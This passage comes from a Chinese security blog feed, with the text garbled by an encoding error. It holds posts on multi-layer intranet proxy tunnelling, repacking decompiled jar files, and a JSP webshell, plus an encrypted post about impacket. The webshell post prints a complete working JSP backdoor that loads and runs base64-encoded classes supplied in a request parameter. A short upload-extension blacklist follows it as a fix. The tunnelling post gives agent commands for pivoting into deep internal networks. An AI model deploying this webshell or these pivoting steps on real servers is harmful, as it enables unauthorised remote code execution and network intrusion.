src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314002917468.png" alt="image-20250314002917468"></p><h3 id="å¤šå±‚éš§é“æ­å»º"><a href="#å¤šå±‚éš§é“æ­å»º" class="headerlink" title="å¤šå±‚éš§é“æ­å»º"></a>å¤šå±‚éš§é“æ­å»º</h3><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250318003945521.png" alt="image-20250318003945521"></p><p>åœ¨å•å±‚çš„åŸºç¡€ä¸Šæˆ‘ä»¬<code>use 0</code>ä¹‹åç»§ç»­ä½¿ç”¨ç›‘å¬</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314003137910.png" alt="image-20250314003137910"></p><p>æ¨¡å¼é€‰æ‹©æ™®é€šæ¨¡å¼1,2æ˜¯iptables é‡ç”¨æ¨¡å¼ï¼Œä»…é™linuxï¼Œ3æ˜¯å¤ç”¨socksæ¨¡å¼ï¼Œè¿™é‡Œæ²¡å¿…è¦ï¼Œè¦æ˜¯æ˜¯dockerå®¹å™¨é™åˆ¶ç«¯å£å¯ä»¥ä½¿ç”¨3</p><p>ç»§ç»­åœ¨æ·±å±‚å†…ç½‘æœºå™¨ä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„10000ç«¯å£</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./linux_x64_agent</span> -c ip<span class="hljs-function">:10000</span> -s 123 <span class="hljs-params">--reconnect</span> 8<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬çš„adminåˆä¼šä¸Šçº¿äºŒçº§ä»£ç†æœºå™¨ï¼Œæ²¡ç¯å¢ƒå°±ä¸å¤ç°äº†</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314004057422.png" alt="image-20250314004057422"></p><p>æˆ‘ä»¬<code>use 1</code>åœ¨åˆ›å»ºsocks</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250314004135114.png" alt="image-20250314004135114"></p><p>è¿™æ˜¯æˆ‘ä»¬çš„widowså°±å¯ä»¥è®¿é—®æ·±å±‚å†…ç½‘äº†åœ¨æ•ˆä»¿<code>node0</code>é…ç½®ä»£ç†å°±è¡Œ</p><p>å¤šçº§ä»£ç†å°±å¯ä»¥äº†ï¼Œé€Ÿåº¦ç¨³å®šæ€§éƒ½è¿˜å¯ä»¥</p><p>psï¼šå›¾ç‰‡æ¥è‡ªç½‘ç»œï¼Œå†™çš„ä¸å¥½å¤§ä½¬è½»ç‚¹å–·</p>]]></content>
    
    
    <categories>
      
      <category>å†…ç½‘ä»£ç†æ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†…ç½‘ä»£ç†æ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jaråç¼–è¯‘é‡æ–°æ‰“åŒ…</title>
    <link href="/2025/03/16/jar%E5%8F%8D%E7%BC%96%E8%AF%91%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85/"/>
    <url>/2025/03/16/jar%E5%8F%8D%E7%BC%96%E8%AF%91%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="javaåç¼–è¯‘jaråŒ…å¹¶ä¿®æ”¹classæ–‡ä»¶é‡æ–°æ‰“åŒ…"><a href="#javaåç¼–è¯‘jaråŒ…å¹¶ä¿®æ”¹classæ–‡ä»¶é‡æ–°æ‰“åŒ…" class="headerlink" title="javaåç¼–è¯‘jaråŒ…å¹¶ä¿®æ”¹classæ–‡ä»¶é‡æ–°æ‰“åŒ…"></a>javaåç¼–è¯‘jaråŒ…å¹¶ä¿®æ”¹classæ–‡ä»¶é‡æ–°æ‰“åŒ…</h1><p>æ‰‹å†™ä¸ªç®€å•çš„javademo</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250316000901953.png" alt="image-20250316000901953"></p><p>æ·»åŠ å·¥ä»¶</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250316000927506.png" alt="image-20250316000927506"></p><p>æ„å»ºjaråŒ…</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250316001012430.png" alt="image-20250316001012430"></p><p>ä½¿ç”¨jadxæ‰“å¼€å¯¼å‡ºæ–‡ä»¶</p><p>ä¿®æ”¹è¦æ”¹çš„javaåŒ…</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250316001753701.png" alt="image-20250316001753701"></p><p>ä½¿ç”¨</p><p>javacé‡æ–°ç¼–è¯‘åŠ ä¸Šjavaçš„é…ç½®æ–‡ä»¶ç”Ÿæˆclassæ–‡ä»¶</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">javac -classpath é…ç½®æ–‡ä»¶ javaæ–‡ä»¶<br><br>javac -classpath <span class="hljs-name">C</span>:\Users\xp\Downloads\<span class="hljs-number">4</span>\resources\META-INF\MANIFEST.MF ./Main.java<br></code></pre></td></tr></table></figure><p>è§£å‹jaråŒ…ç”¨ç¼–è¯‘çš„classè¦†ç›–åŸæ¥çš„class</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>-xvf Main.<span class="hljs-keyword">jar </span><br></code></pre></td></tr></table></figure><p>æ‰“åŒ…jar</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">jar -cvfm æ‰“åŒ…çš„jarå é…ç½®æ–‡ä»¶ æ‰“åŒ…å†…å®¹ <br>jar -cvfm Demo.jar <span class="hljs-keyword">META</span>-<span class="hljs-keyword">INF</span>/MANIFEST.MF Main.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>jaråç¼–è¯‘é‡æ–°æ‰“åŒ…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jspä¸€å¥è¯æœ¨é©¬</title>
    <link href="/2025/03/15/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <url>/2025/03/15/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">ClassLoader</span> &#123;<br>        <span class="hljs-title function_">U</span>(<span class="hljs-params">ClassLoader c</span>) &#123;<br>            <span class="hljs-variable language_">super</span>(c);<br>        &#125;<br>        public <span class="hljs-title class_">Class</span> <span class="hljs-title function_">g</span>(<span class="hljs-params">byte[] b</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">defineClass</span>(b, <span class="hljs-number">0</span>, b.<span class="hljs-property">length</span>);<br>        &#125;<br>    &#125;<br> <br>    public byte[] <span class="hljs-title function_">base64Decode</span>(<span class="hljs-title class_">String</span> str) throws <span class="hljs-title class_">Exception</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title class_">Class</span> clazz = <span class="hljs-title class_">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (byte[]) clazz.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>).<span class="hljs-title function_">invoke</span>(clazz.<span class="hljs-title function_">newInstance</span>(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;<br>            <span class="hljs-title class_">Class</span> clazz = <span class="hljs-title class_">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-title class_">Object</span> decoder = clazz.<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&quot;getDecoder&quot;</span>).<span class="hljs-title function_">invoke</span>(<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> (byte[]) decoder.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>).<span class="hljs-title function_">invoke</span>(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-title class_">String</span> cls = request.<span class="hljs-title function_">getParameter</span>(<span class="hljs-string">&quot;passwd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_">U</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getClassLoader</span>()).<span class="hljs-title function_">g</span>(<span class="hljs-title function_">base64Decode</span>(cls)).<span class="hljs-title function_">newInstance</span>().<span class="hljs-title function_">equals</span>(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>ä¿®å¤å»ºè®®åŠ ä¸Šwafå‡½æ•°</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>[] BLACKLIST_EXTENSIONS = &#123;<span class="hljs-string">&quot;.jsp&quot;</span>, <span class="hljs-string">&quot;.jspx&quot;</span>, <span class="hljs-string">&quot;.jspf&quot;</span>, <span class="hljs-string">&quot;.jsw&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>&#125;;<br>...<br>        <span class="hljs-keyword">try</span> &#123;<br>            smartUpload.<span class="hljs-built_in">upload</span>();<br>            <span class="hljs-type">String</span> id = rq.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-built_in">File</span> smartFile = smartUpload.<span class="hljs-built_in">getFiles</span>().<span class="hljs-built_in">getFile</span>(<span class="hljs-number">0</span>);<br>            <br>            <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨é»‘åå•ä¸­</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isExtensionAllowed</span>(smartFile.<span class="hljs-built_in">getFileName</span>())) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">IllegalArgumentException</span>(<span class="hljs-string">&quot;Fuck you ~&quot;</span>);<br>            &#125;<br>            <br>            smartFile.<span class="hljs-built_in">saveAs</span>(<span class="hljs-string">&quot;/userImg/&quot;</span> + smartFile.<span class="hljs-built_in">getFileName</span>().<span class="hljs-built_in">toString</span>());<br>            out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;ä¸Šä¼ æˆåŠŸ!\&quot;);window.location.href=&#x27;teacher/personal.jsp&#x27;;&lt;/script&gt;&quot;</span>);<br>        &#125; <span class="hljs-built_in">catch</span> (Exception var9) &#123;<br>            out.<span class="hljs-built_in">print</span>(var9);<br>        &#125;<br>...<br>...<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title">isExtensionAllowed</span><span class="hljs-params">(<span class="hljs-type">String</span> fileName)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">String</span> extension : BLACKLIST_EXTENSIONS) &#123;<br>            <span class="hljs-keyword">if</span> (fileName.<span class="hljs-built_in">toLowerCase</span>().<span class="hljs-built_in">endsWith</span>(extension)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>...<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>jspä¸€å¥è¯æœ¨é©¬</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>impacketå·¥å…·é›†</title>
    <link href="/2025/03/14/impacket%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    <url>/2025/03/14/impacket%E5%B7%A5%E5%85%B7%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5745315566f6c847a85013d67100724eedfb486cd8bd7e3befae421b01be1786">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d04546ad5c344f1f52021f20e3c4a56e9b8401de2754d08698a3f6a6b91142eea318d3ab7a9416a3bab33ba1cd0ef6e28800f34c737a61fbe7060ac126b4a70a266d481a79f5832f33adb909164468f0e7369928346b5f16c6d3d61854cea59a0f391304c69cc96b73b6cfbcb8b042e84cd7c5d29a71a0b6149cff2191c664898c807153d9121803e633ed03b78630340e9acd26085318e3797061546e165250080aaa7005c8845dd6d477704f49162c929b8d7f085742e06979533288155e045102746afc5dc5f06c3d48d13967856a61f142f6b4e9fcea609be3fa2b6cc6f019c399f6e84c345f4f5f81d7e527ae8554551fe240e01fa2b6e6dc54a67dd1693d4af5c60ed01f86cf0f2f09625cfbf44ae884d75d90dfbff5232ada285314925bc94a919b40703d1617a408a0a0f11d6e5f7e6657dd5aec61721a4362abcbc0ed6c622a7cc79ab9649a55b7a583a204681b3de0bf5f07a55cf1ec156491e158351c471f80429ad9d58aa2dd9bb7f1a497c26b16182b79264ea8000cfa88b0eb368dbd11ac1f29e1de6406504b940261d3466c2b76c930543fe15cdcecf48c43ab07d1842fe6b6fc3121832529f5584ddde3ede88dc02088cf315b3e85b05a020a89de8f52316937d47cdbeaed4b88760e041b67039a97b1eee5e9f32a73a198517154b983957787f36789c20f47368db3905a8ea5dcb2a88ec2f715bd9495e2cb488e71163eaf4e9131c59799642373af0d550eed981eb3a352b0615fca96a9933560e4e4895ca8a2b8c98b39ce63e4e9126c12c54f738844c54681fdef92c368edb44114910f5f12e38da137acf750e1c165e786db00f776edd080befe1b5b7b9f8c5ad6800fbb3ffdcd4ec3eea13e327821370a2c572f7565b1b05ae57e19422a6b69a2c968a420e4b6ee9f104fd0d6893282bf5e62929a447d7a9eaa7d060ad37fd2081dc7b40c523f8dfd4d6a51c25f0facfe16a195b3a8b686f0f71d311f11a6122c8c08226ea559abf7ac5839082f18ef25f15c813264c009162104c93ec438b94ef22375a702ab41dd155968a09966c1663817b932b72f7d8af7c90a08425de6330c5e02446d74617a15e821fc08ae9d20d8346219e23f55a67de8065180945a40a11593ed644547a23a59dcd9e01486971d6745a7affe65120394a0734c576837604ca9600a5e3ee92cbb4d7818d5f23d61cb8fa0f3cb7ce379bfcdfd2c6d04c3efe4579b3cc55ef645181ce8759ddca7569b396612a279570719a4bf889f711c20439953dcc370f71ed7ceb7826a1be5884c924f3e072c5797e3dff0ac92f496cdf16c13ed1f83b728a7869d14f3cfbf5e489606632206d8bd1ec49c5a441d18c91742aa1464a1017ac96f99ed138e0b2488e906c778b4142793bab1279bef9b32a2034f3251707a65502466deddd1945e5799453942eb064b7207575845d9564ad54390fbb0daee69860cd75bcfb5480a667325b7ccf6801fecb15dc240db083f252fa5667b22457c714a56195537525b2d7f5a972b3c39d1bc38006d104c68027769ecc2e6e14271f26edb40b9c55a8df3c67de3c84c7e72eeb290f703923b319fe8cc079637ab2d0e720576ac6ed90374df4415b729f2a33b0e852986e82df473aa998e7db0d5c3320bec990735f3598ed8740290e9d8bc3b63c7f668ac4f7d7d583a759fcb98b25220d2ce4df43fe23b26e450b9a10a2c28376ec925dd057fa6ead83ae32d2892616418cc52ebdcb2ece06a6d81bdf2092d5386ebc4519ffa464cffac3af0253f02ad99f8307399f059f7c86813b8b659199cbfeb2f839fb921fef478b121ec457e45b2dc67d442ffe5975931bc1c016f16d96dd5072bb62b93db0e93d65aadef2d68b9b93fb29df071e774bd9aee9b0e614ca552fd208851255c63cf60c9fbb104432d7c9c2445091ab64d456e658862378eb1fc160592865d761b3905b18c95f1b364026f6a82cab6220743d50ca550328b7934b026da5ae7692f3da00dbd77896080f90f65a6eb6f4a3367c65f9966c27a13986a60efaf4c56c6d3b5a036f9496fca2e4a403228247655cca2a8f45df9486a6425bbc9d166bf715aa8c10f2045744aff64b914f620a98b316a780364caa65081716de77456bffe7d431d3c6bcba30220f67262f14407a5227e58e84c31ae4e9123ee9d1a7ea09032013f5ba047914a33e3b27f023ee9b5234a37848629df9258dadeffef0319c7bb2e928198e1e00656e99ce8e2de9a5f9f0dd2c521ef0dd09d2f9b6ca76e7bc2347842f536f918ac8b705e2fd412d44488fff5b37e69e0d9a77499cf12fbd9998e8af1b957b94601242667e6df86a84e97725f1b85a26aff3959ce2a343c01870b7c84f7404f98d1b10058b83b9f7f1c5119a1da5254d7791e002c6c97d483c035b00849922f55bb8fdfdc21c6e4c29343509cfe8ac832b53dacf05b76841c94237ade1cab733274a04db9bf2f5c22303ee9def1440fb2b609793ffe53e2715b3e2ba0c1f4870b62623b62f5776e011340d9aac6928bd9090756408b121ece360197ec4a994111559290fd54770a34a2023023cc964e692fb0b82ab9a0240f5f338c962e2f6d5dfdc523f63f1afd3eedb270c624fb2a3ae5b480821a283e51c5cc3584c088dd24ed046c4a154d2b5da3d01d1ad6f1883caed1f90a2a12f49324eeb9773ca57e47bf6fff7940e977c1103020bdf975c926f90d8abb1d6324817839fc37b8cd7af76e376fe0b81b801e42f1f8730297b55a69a697d5699fd832886afe692d30f43e0a7fbd10e395bbbd76447680c2adb29d9ef9242defc73bbc874bc9f397a9c22e6d3fe590d2b5e320689343f15e36ac5edc375b216fa9aabbe037bd2ee8f91312cba5e9d7ed139437f111189021f1dce86c3c30745621bdcef4bec5eb7c9cb43b1c6fd1393e287c2455df473f2044efa0ce1c8c7244c5c604f69d464295851750e1ed24a5c49f4aeb3531ef50589cbb66a50642312c1641519af0fc027b9b092bef41d7dc603ff749552b8560b69ba9f70c75abd589a9a087d7c9e5a8c43c34424d6810982358b5e13339e36f9caa0e3332074d567c1adefe180d157192217ad18d751ea92bba7e744611b84c03de88f9bb87d263e444e59f660f86a1f064f8778b7d528fd083d298ab1afde1641b0a349e5f0aa72c488e2055d08b982656875aa6739e671c7f00d7037ffe819fcf89729a03dfb13edb100e398b47926bb6d1dbb458f631c368eeb963df80e68a7e2cc3aba9d3b59ed4b89d670764b180f05e6de69f81bd89dbc7414627e413f2d837fc80a40555162bdf723f81a3045142a6574db18197939d98582f131317306af55a6173f0299362194a0ea09158cdf2b0d4544065dec0fad65185c4b49b58a72ebeac3ac9c089f65b13b54d68fba3bfb52a1b4191409d4df9d08ec3e69267126bc446c0e182ac7d5ec227a04e14018d48ed6ab9d165edcb068358b5912e17ffa1ad9a8ced73151fd7986e6d7eb64138683a0641f3a7def69494ad7e9d1defeb373f65cead7fd3654a2239c03030866952824581dd24d602974e76d6d683096f49a580026850a107b4e249d19d0b1f71db886a8324148f3ceb9dce202c1467eb01a6f9116061dcb5d1bbba65193b39b1d30b3cb5c585e2017a838c749af6935c4e86808bf5a918e5f75d19e28bf30b98b7e726899b772f0398d4cc723765caaafe21971c21f12ac6655ae4842579229b59c6457bc6ec4b9afdf5f7ead447b62dfb743e4af49c7fe2673bd77765c1f53a9ab11335ee3d99c64586ea886c88864ee5e65198dddac3f39c0dc337025a1c3433ec721457cc2ee8bd71f70fc356c7cd8ca784f4e52f94928be8f24db94625ddd7020bd39ab5f9608cc77177811c96885f57bdbf09680748ea26d9b3e349497dcccfb62f022705976ecf766301125b18be6216a4f0d458585292ed83e1b42772e5a295beb725e2ee21b9298bb183f1e9ef80a941be6347c7dd9d98e2c62bdbb181c3cccc452988d08ed44930b5b3636feda5ae95550d48ab7264f8bbe489b76f4bd89bea989a0cd3e327adfde4c77c2d828f5a7c97c6c0ae5cdad3637cd1731741bcf37b5346aec2fbf7ba8f6e66da4ec561fe0cb74eb41adc6b3ae582b9a8509136f53a402fff3f7e444a24a1622618839e2d22b7a6045b1f845770d91f44e4224bd4f5e90808a5479993dfb3d9b202346f3bd00d3c270073c08891a836dc3a7892e5388175ce6251282077652c936e24944f4b298eb1e29eebdf2ceadccbd5694b398fc91f1662d9234d201e5e60f2722355afc1bed64ab327b961645570ec1de2993617caf7e017d7817213ae1eeb3579d49fe52bd6a321fb2f08258629f2e4c4b9741045572b16ce186c48fbb26c8deb8a6957ea299c5cba46ebc97a0904c427051a478c18f47ddff92bb284457ebb5916a6616c170edec9c79d99f42e06ed0af77272cafcba547a4a1542cfa67710e686b6d6ae18d28dd546f7d66241fe39b180f1217a30a3753e5cd2830ec6ec3e2a47144171531b487745a2dcdad4768bf2cd86103c4a40a240b17a05eaf2500ab827bbb0d7f00427ce2e1c7135bafa573b3d24c79ed50c3966be0f3a2aa827ccf2f997b05b0f133007e029db66ce5f8426c39144f0ff6692c5675a475f6aaf6bd6395d84d6b07d0c96eb66eb5c54a66c17ad9f8432c6423556021e678d696a7cde29f03f9c6cfdc32fc3ddb2fa8df3352c18aa20d6d267cace76d162590a8905226768c000396dec796bab2afa1ce1796490406cc4d902a58e11abf83a5722e374132cc8abaf9f35707b640eabbacdcacd63b67dc0b4674dae140794c27e5496b7229af26183990ca18e6fe8b1e23aafb02dbd9eee4fc36ac2ca317009e3e516d11839a0d7d7f99504987424bce41e7867c0ad8ae0e1728c3d527c9223fa3709f2c5e2b9fa672e0bbb775b470776cf49ceaa28ab2526e0b16a08f409bf071ab4fc23330d573f417cc84df729b4c828007a4492433a732d8a546c13cd6e22fe7c112ff139f4d9420f55d569f5c99dee4e876f7ed54328df2263eabaa41fef4cc763202e497f957e254c77135fb181137f1ec7f151addf8543931cb7618023831b14c0ca10b5c1ceab0977f125a8dcfe779ee8c5a7645b21266b9e79eb58aa8b1a1c0ba0244496690ecfeae3943fc727537566cbada564d870f43ba2ca4b44ab82378894fa7f2f619abdafd0ada26652e51054d3e790899606b731a61f9ced67ef12f0f11ec0dce556945d9252c7ed354a5c9aecf7a094f125e6e9e4cdc42abc6fc6f8b383352b2f7ea172c6536c6d02728bbacf21cbfd6da59a43de06e0cd46b3cd129fcbd8c29a85063e65b64dacb10f023b9ac91f89a4f4a7f74204bd3cfa585f3ad87f9246448aa0a7a01afcf3968ecbfc6e58f753cf2bd1f8a773785a7f7c16b4f3e8915089655f53fce9acf669ff8c3557f1bcbf5f0944da449081b7206b2cd3fc6d46f73a9d82bd16d70c552179c12804255495f370ccf8e734b17bd2180932b4b944eb74bdd99279f35dc75af6ab375b8e61ef92d0fabfa0c8d3852f4456d7928158eda8d9390f015f9ef66582c0dc850308973f1fc623e9c1e287628a2ae68494ebd87596eaa208d485d2bb136f3c78d08b4f4fbaa852810e6fed028de4a5925f708a8967cfe1edcb407a5c8c9c09e25ce0a0237297c92bde6eb4916a9da51aa65e317297f3d36e984735ed2bba149cc6bc50984aee21ed4b23239bb43c40635d8f7c219ef34b977379e05f97b76038cf70a9a8ffabf7f65278c8c74d8520c74f6cdcefd97f4fda79fd6aa1b665f658c3623952d2c1f090d748cf11f56e17001e8d894c101962d127546667dd5ada9141d3810a80c908f7e12db28d852fd627738bc5c45b00753a74d2131f229e33fbda6c3f9ecc5288342ceaec573566d690318d8f64485f7afbcc86de84f975afee6df79feea101384daf52b89e969a02dad700be8d9fbfe35fae50b93d910a2be8e45a799f557c99580a36c32e04b884d37aa02ac2dc7d594e2cc705755d8fd2f2bcf399386a89b3e714baa73f754a3414f8b59061c49dfc5e7fa40cb735065d55e84118a501e24d38218566a919f7b36de5f67906fd92233db4ae8359335daed3041f1ff5c1cdb158cfef2e9642367df207bc81bda6223ed9b5e97967fc8b222aa7de0ca935e91adafc22af428b024a91c340a32b26543885df7b4483d85c7b4e576f6e0b3e2afeac99207a85d90fe2fc10be6923dc7f7ce21617c84a0800f82d609db311995f831fe5f1139ef3ae8f6d80e402bf0a6864783c822f582866ead4c4e58ce638bdf8e72f44e3c9b9d7746e2168791a3c3d4c2269af4f3d0221b2ac3af7d7b4f5dea302c0d3b6ac8a71342d379865d935b50c0cc4b4fb00c05d368dc85e3dc8ae809eba08b1f749eac6bfbf244c4fe1857bf25370819db535c4df1c0deffab07123c448f0bc51d21cb6589079fac38ed3de62d4b03adca0eeb38ad69964dc38ed22b12d985ad9b29b095a3004f1c8df56cf34b251cc23f8abe5fa42ce9f0287499594dce1d48504ec519e8bcddcc49e68d195764a8f27fc72870dc667225b10dbea9779a664bcf191d658c789726973834abd4831856c08f653139098aba7cee2a197684d9c533004229f704cbb6eebbd51e810ccd3b84cc4189cd7b9c7b6bec44dda8382dac8603f7b22a38deb79a3c68ce5de64ef44d6bbb316591927ba539f57d91ccad80bda6ae906b58e58206c3ff0a40ba31cb12e370d29e378c45d67c7785c8f46c7bdfbe12bc50ee660a22af3be8a10d59bbbc7d7368f969762ffd962f3cc0fb3b25620e6b7d3d2d43231db672a521b4c0135a48b9fad9dfcf83c5370e1786df8442324ac11e121c04d1cc267bb193075f2a4558995929c7cdc58dda66a194e8d042f8c54e3b8bc602e8f705b2bfeb1b03fdfce1a06476ff047a6f3c7c680ca3df9db4a5b04650361311c306d8693f3449539d1dc680351265af12b5d87d28c1fca350940c3f2fb12e1994bd6a4e9f61b60941ce0aee7fd7edcae60e5c728335f7f97626de3b55337135abd181a16502d0d89c21c648fd7321ef153e308ba95285409a2a8e0c4316f00d69fe94dbc7b009d384a87176651e84f8ee8ca16f6a9605a0b5e34946f486899aee1a4c2394b462861fa17913828103f3bb398ca148eb51fee5527b1c545ec63a0fd1a1a42b37d2b995ae5935e501ca4cf0c3acad01ddd3bf1f2ff4272c0bd307024befa483fb078db076b2fcda0240d13278a16b2a17e49e69a3d5a1f4bd98c5e4d8d6292856946c64ac990675fa7e307e20f39d0e0ed38b5f7fab1f9270aa0e937c42452b3465800842f8166deaed71af0a5d056fe06eaeb4220a459a93cc75d088177701a7414a4bf95f3381aba736fdf0ddbae8ee5cf17b09992e0ae7c6f5cc7ad8e3caee07d6b021b1ba91aebcbf502fcec37ae601f1f48e855e2587010171192615d7065a2cf2624d45990d5e4258ed3d4bd9c47d8222b68e4e6094e1ce1a244256ee7c0f15b7c9a82fd9719628cf7f429cd34b566043418856f61e7bc59fba009eeada203edb6f8d92fa78075d09db37fbc6d646077da40369ba20e043e9293fdb57d3094255965ed8342634802715c9a8791ca1baef135031c8910949086b2bbc3e8cea83cc890465cbc70529e149eb9bf4dceb0726c49ae70b19f7e74e94f7f185907354aca30298ffaac26ea5b1f67aa64bec3d617e0ba30837621bd7144f5edb09a0c25caab4fb8701739866130b163c3556da9ef4931c3f5cfeb2e298702553a55bc4f9caa0eb9ebc88f0ff0b522495319e7378b4082f316f61a9b3208fdf4456dfc0a710f0d440476dddbd1ff9e28356ed5648e77fa48e82b85d4fc18374b52a90513f948b64a3067c1c7254f1906ecce03daba6e4a4107867c69a58e2801f77d0ec7e804f4de619eabc361278820102fad533618467475cd8528522d5668580c3ab85a2c5d380ff3e2969c7af955d286053e33129e7c2db7b29fb93a91d6fa4956116015cfca47dd0cb74da6a81c9ced70df04ecd40d0833f086ce28093e7eb709f519e0789c4da0773c6bf8171ffe1f3fd2e6ee46dc6222373b575201b29cac26b114bc345d03fa5526bc4125bbad6db36daa1f25188860312732f571b0aeccded5dedeab02cf7c5ff50f1554329ee7457da377f22504d436c9ba495b4b98755570888eda5b4c22d6b970640f04b4fe3fe2bde8150d1bc4e8958f1bb0e59724877e0eee9f6a643f15d74de05c8a3c063f23cab20d4548a92deb7c5e1ec51129588b4c5d17dcfe7b3c6250919d60c5c598ed93893c2e65f94a554db9c64f3a